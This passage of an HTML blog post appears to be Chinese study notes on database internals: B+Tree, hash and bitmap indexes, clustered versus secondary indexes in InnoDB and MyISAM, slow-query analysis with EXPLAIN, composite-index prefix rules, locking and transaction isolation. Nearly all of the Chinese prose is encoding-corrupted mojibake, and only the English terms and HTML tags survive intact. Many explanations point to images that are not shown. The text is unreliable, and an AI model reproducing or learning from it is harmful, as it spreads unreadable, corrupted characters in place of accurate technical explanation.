âˆš</span></h4><ul><li><p>B+Treeæ›´é€‚åˆç”¨æ¥åšå­˜å‚¨ç´¢å¼•</p></li><li><p>B+æ ‘çš„æŸ¥è¯¢æ•ˆç‡æ›´åŠ ç¨³å®š</p></li><li><p>B+æ ‘æ›´æœ‰åˆ©äºå¯¹æ•°æ®åº“çš„æ‰«æ</p></li></ul><h4><span id="æ‹“å±•é˜…è¯»">æ‹“å±•é˜…è¯»</span></h4><p><a href="https://www.jianshu.com/p/7a2017e830a0">https://www.jianshu.âˆšcom/p/7a2017e830a0</a></p><h4><span id="hashç´¢å¼•">Hashç´¢å¼•</span></h4><h5><span id="ç¼ºç‚¹">ç¼ºç‚¹ï¼š</span></h5><ul><li><p>ä»…ä»…èƒ½æ»¡è¶³â€œ&#x3D;â€ï¼Œâ€œINâ€ï¼Œä¸èƒ½ä½¿ç”¨èŒƒå›´æŸ¥è¯¢</p></li><li><p>æ— æ³•è¢«ç”¨æ¥é¿å…æ•°æ®çš„æ’åºæ“ä½œ</p></li><li><p>ä¸èƒ½åˆ©ç”¨éƒ¨åˆ†ç´¢å¼•é”®æŸ¥è¯¢</p></li><li><p>ä¸èƒ½é¿å…è¡¨æ‰«æ</p></li><li><p>é‡åˆ°å¤§é‡Hashå€¼ç›¸ç­‰çš„æƒ…å†µåæ€§èƒ½å¹¶ä¸ä¸€å®šå°±ä¼šæ¯”B-Treeç´¢å¼•é«˜</p></li></ul><h4><span id="bitmap">Bitmap âˆš</span></h4><p><img src="/2020/03/23/database/clip_image002-1584950246040.jpg"></p><p><strong>ä½å›¾ç´¢å¼•</strong>æ˜¯ä¸€ç§ä½¿ç”¨<a href="https://baike.baidu.com/item/%E4%BD%8D%E5%9B%BE">ä½å›¾</a>çš„ç‰¹æ®Šæ•°æ®åº“ç´¢å¼•ã€‚</p><p>ä¸»è¦é’ˆå¯¹å¤§é‡ç›¸åŒå€¼çš„åˆ—è€Œåˆ›å»º(ä¾‹å¦‚ï¼šç±»åˆ«ï¼Œæ“ä½œå‘˜ï¼Œéƒ¨é—¨ID,åº“æˆ¿IDç­‰),</p><p>ç´¢å¼•å—çš„ä¸€ä¸ªç´¢å¼•è¡Œä¸­å­˜å‚¨é”®å€¼å’Œèµ·æ­¢Rowid,ä»¥åŠè¿™äº›é”®å€¼çš„ä½ç½®ç¼–ç ,</p><p>ä½ç½®ç¼–ç ä¸­çš„<font color="red">æ¯ä¸€ä½è¡¨ç¤ºé”®å€¼å¯¹åº”çš„æ•°æ®è¡Œçš„æœ‰æ— </font>.ä¸€ä¸ªå—å¯èƒ½æŒ‡å‘çš„æ˜¯å‡ åç”šè‡³æˆç™¾ä¸Šåƒè¡Œæ•°æ®çš„ä½ç½®.</p><p><strong>é€‚åˆ</strong>ï¼š</p><ol><li><p>è¿™ç§æ–¹å¼å­˜å‚¨æ•°æ®,ç›¸å¯¹äºB+Treeç´¢å¼•,<font color="red">å ç”¨çš„ç©ºé—´éå¸¸å°,åˆ›å»ºå’Œä½¿ç”¨éå¸¸å¿«</font>.</p></li><li><p>å½“æ ¹æ®é”®å€¼æŸ¥è¯¢æ—¶,<font color="red">å¯ä»¥æ ¹æ®èµ·å§‹Rowidå’Œä½å›¾çŠ¶æ€,å¿«é€Ÿå®šä½æ•°æ®</font>.</p></li><li><p>å½“æ ¹æ®é”®å€¼åšand,oræˆ– in(x,y,..)æŸ¥è¯¢æ—¶,<font color="red">ç›´æ¥ç”¨ç´¢å¼•çš„<a href="https://baike.baidu.com/item/%E4%BD%8D%E5%9B%BE/1017781">ä½å›¾</a>è¿›è¡Œ<strong>æˆ–è¿ç®—</strong>,å¿«é€Ÿå¾—å‡ºç»“æœè¡Œæ•°æ®.</font></p></li></ol><p><strong>ä¸é€‚åˆ</strong>ï¼š</p><ol><li><p>ä¸é€‚åˆé”®å€¼è¾ƒå¤šçš„åˆ—ï¼ˆé‡å¤å€¼è¾ƒå°‘çš„åˆ—ï¼‰ï¼›</p></li><li><p>ä¸é€‚åˆupdateã€insertã€deleteé¢‘ç¹çš„åˆ—ï¼Œä»£ä»·å¾ˆé«˜ã€‚</p></li></ol><h3><span id="å¯†é›†ç´¢å¼•å’Œç¨€ç–ç´¢å¼•">å¯†é›†ç´¢å¼•å’Œç¨€ç–ç´¢å¼• âˆš</span></h3><p>Ã˜ å¯†é›†ç´¢å¼•æ–‡ä»¶ä¸­çš„æ¯ä¸ªæœç´¢ç å€¼éƒ½å¯¹åº”ä¸€ä¸ªç´¢å¼•å€¼</p><p>Ã˜ ç¨€ç–ç´¢å¼•æ–‡ä»¶åªä¸ºç´¢å¼•ç çš„æŸäº›å€¼å»ºç«‹ç´¢å¼•é¡¹</p><p><img src="/2020/03/23/database/clip_image004.jpg"></p><p><strong>å¯†é›†ç´¢å¼•</strong>ï¼šå¶å­èŠ‚ç‚¹ä¿å­˜çš„ä¸åªæ˜¯é”®å€¼ï¼Œè¿˜ä¿å­˜äº†ä½äº<font color="red"><strong>åŒä¸€è¡Œè®°å½•é‡Œçš„å…¶ä»–åˆ—çš„ä¿¡æ¯</strong></font>ï¼Œç”±äºå¯†é›†ç´¢å¼•å†³å®šäº†è¡¨çš„ç‰©ç†æ’åˆ—é¡ºåºï¼Œä¸€ä¸ªè¡¨åªæœ‰ä¸€ä¸ªç‰©ç†æ’åˆ—é¡ºåºï¼Œæ‰€ä»¥ä¸€ä¸ªè¡¨åªèƒ½åˆ›å»ºä¸€ä¸ªå¯†é›†ç´¢å¼•</p><p><strong>ç¨€ç–ç´¢å¼•</strong>ï¼šå¶å­èŠ‚ç‚¹ä»…ä¿å­˜äº†<font color="red">é”®ä½ä¿¡æ¯ä»¥åŠè¯¥è¡Œæ•°æ®çš„åœ°å€</font>ï¼Œæœ‰çš„ç¨€ç–ç´¢å¼•åªä¿å­˜äº†é”®ä½ä¿¡æ¯åŠå…¶ä¸»é”® </p><h3><span id="innodb">InnoDB</span></h3><p>Ã˜ è‹¥ä¸€ä¸ªä¸»é”®è¢«å®šä¹‰ï¼Œè¯¥ä¸»é”®åˆ™ä½œä¸ºå¯†é›†ç´¢å¼•</p><p>Ã˜ è‹¥æ²¡æœ‰ä¸»é”®è¢«å®šä¹‰ï¼Œè¯¥è¡¨çš„ç¬¬ä¸€ä¸ªå”¯ä¸€éç©ºç´¢å¼•åˆ™ä½œä¸ºå¯†é›†ç´¢å¼•</p><p>Ã˜ è‹¥ä¸æ»¡è¶³ä»¥ä¸Šæ¡ä»¶ï¼Œinnodbå†…éƒ¨ä¼šç”Ÿæˆä¸€ä¸ªéšè—ä¸»é”®ï¼ˆå¯†é›†ç´¢å¼•ï¼‰</p><p>Ã˜ éä¸»é”®ç´¢å¼•å­˜å‚¨<font color="blue">ç›¸å…³é”®ä½</font>å’Œ<font color="blue">å…¶å¯¹åº”çš„ä¸»é”®å€¼</font>ï¼ŒåŒ…å«ä¸¤æ¬¡æŸ¥æ‰¾</p><h4><span id="ä¸»é”®ç´¢å¼•å’Œéä¸»é”®ç´¢å¼•-">ä¸»é”®ç´¢å¼•å’Œéä¸»é”®ç´¢å¼• -</span></h4><p>ä¸»é”®ç´¢å¼•å’Œéä¸»é”®ç´¢å¼•çš„åŒºåˆ«æ˜¯ï¼šéä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜æ”¾çš„æ˜¯<font color="red"><strong>ä¸»é”®çš„å€¼</strong></font>ï¼Œè€Œä¸»é”®ç´¢å¼•çš„å¶å­èŠ‚ç‚¹å­˜æ”¾çš„æ˜¯<font color="red"><strong>æ•´è¡Œæ•°æ®</strong></font>ï¼Œå…¶ä¸­éä¸»é”®ç´¢å¼•ä¹Ÿè¢«ç§°ä¸ºäºŒçº§ç´¢å¼•ï¼Œè€Œä¸»é”®ç´¢å¼•ä¹Ÿè¢«ç§°ä¸ºèšç°‡ç´¢å¼•ã€‚</p><p><img src="/2020/03/23/database/image-20200323160333643.png"></p><p> <font color="red">InnoDBä½¿ç”¨çš„æ˜¯å¯†é›†ç´¢å¼•</font></p><ul><li>ä¸»é”®ç´¢å¼•çš„B+Treeçš„å¶å­èŠ‚ç‚¹åŒ…å«ç´¢å¼•å’Œæ•°æ®</li></ul><p> çº¢è‰²çš„æ˜¯ç¨€ç–ç´¢å¼•çš„æ¡ä»¶ç­›é€‰ï¼Œéœ€è¦ä¸¤ä¸ªæ­¥éª¤</p><ul><li><pre><code>ç¬¬ä¸€æ­¥ï¼šåœ¨ç¨€ç–ç´¢å¼•çš„B+Treeä¸­ç´¢å¼•è¯¥é”®</code></pre></li><li><p>ç¬¬äºŒæ­¥ï¼šä½¿ç”¨ä¸»é”®åœ¨ä¸»é”®ç´¢å¼•B+Treeä¸­å†æ‰§è¡Œä¸€æ¬¡æ£€ç´¢æ“ä½œ</p></li></ul><p><font color="red">MyISAMä½¿ç”¨çš„å‡ä¸ºç¨€ç–ç´¢å¼•</font></p><p>èŠ‚ç‚¹ç»“æ„å®Œå…¨ä¸€è‡´ï¼Œåªæ˜¯å­˜å‚¨å†…å®¹ä¸ä¸€æ ·ã€‚<font color="red">ä¸»é”®ç´¢å¼•B+Treeå­˜å‚¨ä¸»é”®ï¼Œè¾…åŠ©é”®B+Treeå­˜å‚¨äº†è¾…åŠ©é”®ã€‚</font>ç´¢å¼•å’Œæ•°æ®æ˜¯åˆ†å¼€å­˜å‚¨çš„ã€‚é€šè¿‡è¾…åŠ©é”®æ£€ç´¢æ— éœ€è®¿é—®ä¸»é”®çš„ç´¢å¼•æ ‘ã€‚</p><h4><span id="èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•">èšç°‡ç´¢å¼•å’Œéèšç°‡ç´¢å¼•</span></h4><ul><li><p>èšç°‡ç´¢å¼•ï¼šå°†<font color="orange"><strong>å­˜å‚¨æ•°æ®</strong></font>ä¸<font color="blue"><strong>ç´¢å¼•</strong></font>æ”¾åˆ°äº†ä¸€å—ï¼Œæ‰¾åˆ°ç´¢å¼•ä¹Ÿå°±æ‰¾åˆ°äº†æ•°æ®</p></li><li><p>éèšç°‡ç´¢å¼•ï¼šå°†æ•°æ®å­˜å‚¨ä¸ç´¢å¼•åˆ†å¼€ï¼Œç´¢å¼•ç»“æ„çš„å¶å­èŠ‚ç‚¹æŒ‡å‘äº†æ•°æ®çš„å¯¹åº”è¡Œã€‚</p></li></ul><h2><span id="å¦‚ä½•å®šä½å¹¶ä¼˜åŒ–æ…¢æŸ¥è¯¢sql">å¦‚ä½•å®šä½å¹¶ä¼˜åŒ–æ…¢æŸ¥è¯¢Sql âˆš</span></h2><p>Ã˜ æ ¹æ®æ…¢æ—¥å¿—å®šä½æ…¢æŸ¥è¯¢sql</p><p>Ã˜ ä½¿ç”¨explainç­‰å·¥å…·åˆ†æsql</p><p>Ã˜ ä¿®æ”¹sqlæˆ–è€…å°½é‡è®©sqlèµ°ç´¢å¼•</p><h2><span id="æ ¹æ®æ…¢æ—¥å¿—å®šä½æ…¢æŸ¥è¯¢sql">æ ¹æ®æ…¢æ—¥å¿—å®šä½æ…¢æŸ¥è¯¢Sql</span></h2><h4><span id="æ˜¾ç¤ºæ…¢æŸ¥è¯¢é…ç½®ä¿¡æ¯">æ˜¾ç¤ºæ…¢æŸ¥è¯¢é…ç½®ä¿¡æ¯</span></h4><p><img src="/2020/03/23/database/clip_image002-1584950743345.jpg"></p><h4><span id="æ˜¾ç¤ºæ…¢æŸ¥è¯¢æ•°é‡">æ˜¾ç¤ºæ…¢æŸ¥è¯¢æ•°é‡</span></h4><p><img src="/2020/03/23/database/clip_image003.png"></p><p>æœ¬æ¬¡å›åˆçš„æ…¢æ¡æ•°ï¼Œé‡å¯å®¢æˆ·ç«¯æ¸…é›¶</p><h4><span id="æ‰“å¼€æ…¢æ—¥å¿—">æ‰“å¼€æ…¢æ—¥å¿—</span></h4><p><img src="/2020/03/23/database/clip_image004.png"></p><p>é‡å¯æ— æ•ˆ</p><h4><span id="è®¾ç½®æ…¢æŸ¥è¯¢æ—¶é—´é˜ˆå€¼">è®¾ç½®æ…¢æŸ¥è¯¢æ—¶é—´é˜ˆå€¼</span></h4><p><img src="/2020/03/23/database/clip_image005.png"></p><p>éœ€è¦é‡æ–°è¿æ¥æ•°æ®åº“</p><p>å¯ä»¥å¯¹my.iniæˆ–è€…my.cnfå»é…ç½®ï¼Œæ°¸ä¹…ä¿å­˜</p><h3><span id="åˆ©ç”¨explainåˆ†æsql">åˆ©ç”¨Explainåˆ†æsql</span></h3><p><img src="/2020/03/23/database/clip_image007.jpg"></p><h4><span id="typeä»æœ€ä¼˜åˆ°æœ€å·®">Typeä»æœ€ä¼˜åˆ°æœ€å·®</span></h4><p><img src="/2020/03/23/database/clip_image009.jpg"></p><p>çº¢è‰²çš„ä¸ºå…¨è¡¨æ‰«æ</p><h4><span id="extra">Extra</span></h4><p>Extraä¸­å‡ºç°ä»¥ä¸‹2é¡¹æ„å‘³ç€MySQLæ ¹æœ¬ä¸èƒ½ä½¿ç”¨ç´¢å¼•ï¼Œæ•ˆç‡ä¼šå—åˆ°é‡å¤§å½±å“ï¼Œåº”å°½å¯èƒ½å¯¹æ­¤è¿›è¡Œä¼˜åŒ–</p><table><thead><tr><th><strong>Etra é¡¹</strong></th><th><strong>è¯´æ˜</strong></th></tr></thead><tbody><tr><td><strong>Using filesort</strong></td><td>è¡¨ç¤ºMySQLä¼šå¯¹ç»“æœä½¿ç”¨ä¸€ä¸ªå¤–éƒ¨ç´¢å¼•æ’åºï¼Œè€Œä¸æ˜¯ä»è¡¨é‡ŒæŒ‰ç´¢å¼•æ¬¡åºè¯»åˆ°ç›¸å…³å†…å®¹ï¼Œå¯èƒ½åœ¨å†…å­˜æˆ–è€…ç£ç›˜ä¸Šè¿›è¡Œæ’åºï¼ŒMySQLä¸­æ— æ³•åˆ©ç”¨ç´¢å¼•å®Œæˆçš„æ’åºæ“ä½œç§°ä¸ºâ€œæ–‡ä»¶æ’åºâ€</td></tr><tr><td><strong>Using temporary</strong></td><td>è¡¨ç¤ºMySQLåœ¨å¯¹æŸ¥è¯¢ç»“æœæ’åºæ—¶ä½¿ç”¨ä¸´æ—¶è¡¨ï¼Œå¸¸è§äºæ’åºorder byå’Œåˆ†ç»„æŸ¥è¯¢group by</td></tr></tbody></table><h3><span id="ä¿®æ”¹sqlå°½é‡è®©sqlèµ°ç´¢å¼•">ä¿®æ”¹sqlå°½é‡è®©sqlèµ°ç´¢å¼•</span></h3><h4><span id="èµ°ç´¢å¼•">èµ°ç´¢å¼•</span></h4><p><img src="/2020/03/23/database/clip_image002-1584950929126.jpg"></p><p><img src="/2020/03/23/database/clip_image004-1584950929126.jpg"></p><p>Nameæ²¡æœ‰èµ°ç´¢å¼•ï¼Œè€Œaccountæœ‰ç´¢å¼•ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†è¯­å¥ä¼˜åŒ–ã€‚</p><p><img src="/2020/03/23/database/clip_image006.jpg"></p><h4><span id="åŠ ç´¢å¼•">åŠ ç´¢å¼•</span></h4><p><img src="/2020/03/23/database/clip_image008.jpg"></p><h2><span id="è”åˆç´¢å¼•æœ€å·¦åŒ¹é…åŸåˆ™">è”åˆç´¢å¼•æœ€å·¦åŒ¹é…åŸåˆ™ âˆš</span></h2><p><img src="/2020/03/23/database/clip_image010.jpg"></p><p><img src="/2020/03/23/database/clip_image012.jpg"></p><p>åˆ é™¤titleåä¾ç„¶èµ°è”åˆç´¢å¼•</p><p><img src="/2020/03/23/database/clip_image014.jpg"></p><p>æŠŠareaåˆ é™¤åªç•™ä¸‹titleåå°±ä¸èµ°è”åˆç´¢å¼•äº†</p><p>åœ¨è”åˆç´¢å¼•ä¸­areaåœ¨æœ€å·¦è¾¹</p><p>1ï¼ æœ€å·¦å‰ç¼€åŒ¹é…åŸåˆ™ï¼Œéå¸¸é‡è¦çš„åŸåˆ™ï¼Œmysqlä¼šä¸€ç›´å‘å³åŒ¹é…ç›´åˆ°é‡åˆ°èŒƒå›´æŸ¥è¯¢ï¼ˆ&gt;ã€&lt;ã€betweenã€likeï¼‰å°±åœæ­¢åŒ¹é…ï¼Œæ¯”å¦‚a&#x3D;3 and b&#x3D;4 and c&gt;5 and d&#x3D;6ï¼Œå¦‚æœå»ºç«‹ï¼ˆa,b,c,dï¼‰é¡ºåºçš„ç´¢å¼•ï¼Œdæ˜¯ç”¨ä¸åˆ°ç´¢å¼•çš„ï¼ˆ<font color="red">cå¯ä»¥ç”¨åˆ°ç´¢å¼•</font>ï¼‰ï¼Œå¦‚æœå»ºç«‹ï¼ˆa,b,d,cï¼‰çš„ç´¢å¼•åˆ™éƒ½å¯ä»¥ç”¨åˆ°ï¼Œa,b,dçš„é¡ºåºå¯ä»¥ä»»æ„è°ƒæ•´</p><p>2ï¼ &#x3D;å’Œinå¯ä»¥ä¹±åºï¼Œæ¯”å¦‚a&#x3D;1 and b&#x3D;2 and c&#x3D;3 å»ºç«‹(a,b,c)ç´¢å¼•å¯ä»¥ä»»æ„é¡ºåºï¼Œmysqlçš„æŸ¥è¯¢ä¼˜åŒ–å™¨ä¼šå¸®ä½ ä¼˜åŒ–æˆç´¢å¼•å¯ä»¥è¯†åˆ«çš„å½¢å¼ã€‚</p><h4><span id="æˆå› ç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ç»å¯¹æœ‰åºçš„ç¬¬äºŒä¸ªå­—æ®µæ˜¯æ— åºçš„">æˆå› ï¼šç¬¬ä¸€ä¸ªå­—æ®µæ˜¯ç»å¯¹æœ‰åºçš„ï¼Œç¬¬äºŒä¸ªå­—æ®µæ˜¯æ— åºçš„ã€‚</span></h4><p>ç›´æ¥ç”¨ç¬¬äºŒä¸ªå­—æ®µæ˜¯æ²¡åŠæ³•èµ°ç´¢å¼•çš„ï¼Œå› ä¸ºå®ƒæ˜¯æ— åºçš„ã€‚</p><p><img src="/2020/03/23/database/clip_image016.jpg"></p><p>ç”¨column3å»ºç«‹b+treeï¼Œé€šè¿‡å…³é”®è¯æŸ¥æ‰¾aliceç„¶åæ’åºã€‚å•é column2æ— æ³•èµ°b+treeç´¢å¼•ã€‚</p><h2><span id="ç´¢å¼•æ˜¯è¶Šå¤šè¶Šå¥½ä¹ˆ">ç´¢å¼•æ˜¯è¶Šå¤šè¶Šå¥½ä¹ˆ âˆš</span></h2><p>Ã˜ æ•°æ®é‡å°çš„è¡¨ä¸éœ€è¦å»ºç«‹ç´¢å¼•ï¼Œå»ºç«‹ä¼šå¢åŠ é¢å¤–çš„ç´¢å¼•å¼€é”€</p><p>Ã˜ æ•°æ®å˜æ›´éœ€è¦ç»´æŠ¤ç´¢å¼•ï¼Œå› æ­¤æ›´å¤šçš„ç´¢å¼•æ„å‘³ç€æ›´å¤šçš„ç»´æŠ¤æˆæœ¬</p><p>Ã˜ æ›´å¤šçš„ç´¢å¼•æ„å‘³ç€ä¹Ÿéœ€è¦æ›´å¤šçš„ç©ºé—´</p><h2><span id="é”æ¨¡å—">é”æ¨¡å—</span></h2><h3><span id="äºŒæ®µé”">äºŒæ®µé”</span></h3><p><strong>ä¸¤é˜¶æ®µçš„å«ä¹‰æ˜¯æŒ‡åœ¨åŒä¸€ä¸ªäº‹åŠ¡å†…ï¼Œå¯¹æ¶‰åŠçš„æ‰€æœ‰æ•°æ®é¡¹è¿›è¡Œå…ˆåŠ é”ï¼Œç„¶åæ‰å¯¹æ‰€æœ‰çš„æ•°æ®é¡¹è§£é”</strong>ã€‚</p><p><em><strong>ä½†ç¬¬ä¸€é˜¶æ®µåŠ å…±äº«é”åå½±å“äº†å…¶ä»–äº‹åŠ¡çš„å†™æ“ä½œã€åŠ æ’å®ƒé”åå½±å“äº†å…¶ä»–äº‹åŠ¡çš„è¯»æ“ä½œ</strong></em>ï¼Œæ‰€ä»¥è¾ƒå¤§åœ°å½±å“äº†å…¶ä»–äº‹åŠ¡çš„è¿è¡Œã€‚åªæœ‰ç¬¬äºŒé˜¶æ®µé‡Šæ”¾äº†æ‰€æœ‰çš„æ•°æ®é¡¹ä¸Šçš„é”ä¹‹åï¼Œæ‰èƒ½è¿è¡Œå…¶ä»–è¦æ“ä½œç›¸åŒæ•°æ®é¡¹çš„äº‹åŠ¡ã€‚</p><h3><span id="myisamä¸innodbå…³äºé”æ–¹é¢çš„åŒºåˆ«">MyISAMä¸InnoDBå…³äºé”æ–¹é¢çš„åŒºåˆ«</span></h3><p>Ã˜ MyISAMé»˜è®¤ç”¨çš„æ˜¯è¡¨çº§é”ï¼Œä¸æ”¯æŒè¡Œçº§é”</p><p>Ã˜ InnoDBé»˜è®¤ç”¨çš„æ˜¯è¡Œçº§é”ï¼Œä¹Ÿæ”¯æŒè¡¨çº§é”</p><p>MySqlå®¢æˆ·ç«¯ä¸­ä¸€ä¸ªTabï¼ˆæ ‡ç­¾é¡µï¼‰å°±æ˜¯ä¸€ä¸ªSession</p><p><img src="/2020/03/23/database/clip_image018.jpg"></p><p>ä¸¤ä¸ªè¡¨é™¤äº†å¼•æ“éƒ½ä¸€æ ·</p><p>ä½¿ç”¨MyISAMå¼•æ“çš„æ—¶å€™ï¼Œå¯¹ä¸€ä¸ªè¡¨è¿›è¡ŒæŸ¥è¯¢ç­‰æ“ä½œçš„æ—¶å€™ä¼šåŠ ä¸Šæ•°æ®çš„è¯»é”ï¼Œå…¶ä»–Sessionè¿›è¡Œå¢åˆ æ”¹çš„æ—¶å€™ä¼šåŠ ä¸€ä¸ªè¡¨çº§åˆ«çš„å†™é”ï¼Œå½“è¯»é”æœªè¢«é‡Šæ”¾çš„æ—¶å€™ï¼Œå¦å¤–ä¸€ä¸ªSessionæƒ³è¦ç»™è¡¨åŠ ä¸Šå†™é”å°±ä¼šè¢«é˜»å¡ã€‚</p><p>åŒç†ä¸Šå†™é”çš„æ—¶å€™æ²¡åŠæ³•å†ä¸Šè¯»é”ï¼Œä¸Šå†™é”åä¹Ÿä¸èƒ½å†ä¸Šå†™é”ã€‚</p><p>å¦‚æœåœ¨æ‰§è¡Œè¯»æ“ä½œååŠ ä¸Šfor updateï¼Œå…¶ä»–è¯»çš„æ“ä½œä¹Ÿä¼šè¢«blockã€‚</p><p>InnoDBæ˜¯äºŒæ®µé”ï¼Œä¸”é»˜è®¤æ‰“å¼€autocommitã€‚</p><p><img src="/2020/03/23/database/clip_image019.png"></p><p>ä¸¤ç§æ–¹æ³•éƒ½å¯ä»¥ã€‚</p><p>Set autocommitåªå¯¹å½“å‰Sessionæœ‰ç”¨ã€‚</p><p><img src="/2020/03/23/database/clip_image021.jpg"></p><p>ä¸Šå…±äº«é”åä¸èƒ½ä¿®æ”¹æ•°æ®ä½†æ˜¯åŒæ ·å¯ä»¥è¯»æ•°æ®ï¼ˆåŒä¸€è¡Œï¼‰</p><p>å½“ä¸èµ°ç´¢å¼•çš„æ—¶å€™ï¼ŒInnoDBä¹Ÿä¼šé”ä½æ•´å¼ è¡¨ï¼Œæ­¤æ—¶ç”¨è¡¨çº§é”ã€‚</p><p><img src="/2020/03/23/database/clip_image023.jpg"></p><p>Xæ’ä»–é”ï¼šå¢åˆ æ”¹ä»¥åŠSelect for updateçš„æ—¶å€™ã€‚</p><p>Så…±äº«é”ï¼šè¯»æ“ä½œ</p><h4><span id="myisamé€‚åˆçš„åœºæ™¯">MyISAMé€‚åˆçš„åœºæ™¯ âˆš</span></h4><ul><li><p>é¢‘ç¹æ‰§è¡Œå…¨è¡¨countè¯­å¥</p></li><li><p>å¯¹æ•°æ®è¿›è¡Œå¢åˆ æ”¹çš„é¢‘ç‡ä¸é«˜ï¼ŒæŸ¥è¯¢éå¸¸é¢‘ç¹</p></li><li><p>æ²¡æœ‰äº‹åŠ¡</p></li></ul><h4><span id="innodbé€‚ç”¨çš„åœºæ™¯">InnoDBé€‚ç”¨çš„åœºæ™¯ âˆš</span></h4><ul><li><p>æ•°æ®åº“å¢åˆ æ”¹æŸ¥éƒ½ç›¸å½“é¢‘ç¹</p></li><li><p>å¯é æ€§è¦æ±‚æ¯”è¾ƒé«˜ï¼Œè¦æ±‚æ”¯æŒäº‹åŠ¡</p></li></ul><h4><span id="æ•°æ®åº“é”çš„åˆ†ç±»-">æ•°æ®åº“é”çš„åˆ†ç±»ï¼š-</span></h4><ul><li>æŒ‰é”çš„ç²’åº¦åˆ’åˆ†ï¼Œå¯åˆ†ä¸ºè¡¨çº§é”ã€è¡Œçº§é”ã€é¡µçº§é”</li><li>æŒ‰é”çº§åˆ«åˆ’åˆ†ï¼Œå¯åˆ†ä¸ºå…±äº«é”ã€æ’å®ƒé”</li><li>æŒ‰åŠ é”æ–¹å¼åˆ’åˆ†ï¼Œå¯åˆ†ä¸ºè‡ªåŠ¨é”ã€æ˜¾å¼é”</li><li>æŒ‰æ“ä½œåˆ’åˆ†ï¼Œå¯åˆ†ä¸ºDMLé”ã€DDLé”</li><li>æŒ‰ä½¿ç”¨æ–¹å¼åˆ’åˆ†ï¼Œå¯åˆ†ä¸ºä¹è§‚é”ã€æ‚²è§‚é”</li></ul><p><strong>DML(Data Manipulation Language)æ•°æ®æ“çºµè¯­è¨€</strong>ï¼š</p><p> é€‚ç”¨èŒƒå›´ï¼šå¯¹æ•°æ®åº“ä¸­çš„æ•°æ®è¿›è¡Œä¸€äº›ç®€å•æ“ä½œï¼Œå¦‚insert,delete,update,selectç­‰.</p><p> <strong>DDL(Data Definition Language)æ•°æ®å®šä¹‰è¯­è¨€ï¼š</strong><br> é€‚ç”¨èŒƒå›´ï¼šå¯¹æ•°æ®åº“ä¸­çš„æŸäº›å¯¹è±¡(ä¾‹å¦‚ï¼Œdatabase,table)è¿›è¡Œç®¡ç†ï¼Œå¦‚Create,Alterå’ŒDrop.truncate</p><p>å¤šSessionä¹‹é—´çš„äº’é”å°±æ˜¯æ‚²è§‚é”çš„å®ç°ã€‚</p><p><strong>ä¹è§‚é”ä¸ä½¿ç”¨æ•°æ®åº“æä¾›çš„é”æœºåˆ¶</strong></p><ul><li>ä¸€èˆ¬å®ç°çš„ä¸¤ç§æ–¹å¼ï¼šç‰ˆæœ¬å·å’Œæ—¶é—´æˆ³</li></ul><p>â€‹ä¹è§‚é”åŠ å…¥äº†ç‰ˆæœ¬æ ‡è¯†</p><p>â€‹<img src="/2020/03/23/database/clip_image025.jpg"></p><p>â€‹ç¨‹åº1ï¼š</p><p>â€‹<img src="/2020/03/23/database/clip_image027.jpg"></p><p>â€‹å…ˆæ‰§è¡Œ</p><p>â€‹ç¨‹åº2ï¼š</p><p>â€‹<img src="/2020/03/23/database/clip_image029.jpg"></p><h3><span id="æ•°æ®åº“äº‹åŠ¡çš„å››å¤§ç‰¹æ€§">æ•°æ®åº“äº‹åŠ¡çš„å››å¤§ç‰¹æ€§</span></h3><p>ACIDï¼š</p><ul><li><p>åŸå­æ€§Atomicï¼š<strong>äº‹åŠ¡ä¸­å„é¡¹æ“ä½œï¼Œè¦ä¹ˆå…¨åšè¦ä¹ˆå…¨ä¸åšï¼Œä»»ä½•ä¸€é¡¹æ“ä½œçš„å¤±è´¥éƒ½ä¼šå¯¼è‡´æ•´ä¸ªäº‹åŠ¡çš„å¤±è´¥ï¼Œå°±åƒåŸå­ä¸€æ ·ä¸å¯åˆ†å‰²ï¼›</strong></p></li><li><p>ä¸€è‡´æ€§Consistencyï¼š<strong>äº‹åŠ¡ç»“æŸåç³»ç»ŸçŠ¶æ€æ˜¯ä¸€è‡´çš„ï¼›äº‹åŠ¡å¿…é¡»å§‹ç»ˆä¿æŒç³»ç»Ÿå¤„äºä¸€è‡´çš„çŠ¶æ€ï¼Œä¸ç®¡åœ¨ä»»ä½•ç»™å®šçš„æ—¶é—´å¹¶å‘äº‹åŠ¡æœ‰å¤šå°‘ã€‚</strong></p></li><li><p>éš”ç¦»æ€§Isolationï¼š<strong>å¹¶å‘æ‰§è¡Œçš„äº‹åŠ¡å½¼æ­¤æ— æ³•çœ‹åˆ°å¯¹æ–¹çš„ä¸­é—´çŠ¶æ€ï¼›</strong></p></li><li><p>æŒä¹…æ€§Durabilityï¼š<strong>äº‹åŠ¡å®Œæˆåæ‰€åšçš„æ”¹åŠ¨éƒ½ä¼šè¢«æŒä¹…åŒ–ï¼Œå³ä½¿å‘ç”Ÿç¾éš¾æ€§çš„å¤±è´¥ã€‚é€šè¿‡æ—¥å¿—å’ŒåŒæ­¥å¤‡ä»½å¯ä»¥åœ¨æ•…éšœå‘ç”Ÿåé‡å»ºæ•°æ®ã€‚</strong></p></li></ul><h3><span id="äº‹åŠ¡éš”ç¦»çº§åˆ«ä»¥åŠå„çº§åˆ«ä¸‹å¹¶å‘è®¿é—®é—®é¢˜">äº‹åŠ¡éš”ç¦»çº§åˆ«ä»¥åŠå„çº§åˆ«ä¸‹å¹¶å‘è®¿é—®é—®é¢˜</span></h3><h4><span id="1-æ›´æ–°ä¸¢å¤±">1. æ›´æ–°ä¸¢å¤±</span></h4><p>Mysqlæ‰€æœ‰äº‹åŠ¡éš”ç¦»çº§åˆ«åœ¨æ•°æ®åº“å±‚é¢ä¸Šå‡å¯é¿å…</p><p><img src="/2020/03/23/database/clip_image031.jpg"></p><h4><span id="2-è„è¯»è¯»å–æœªæäº¤æ•°æ®">2. 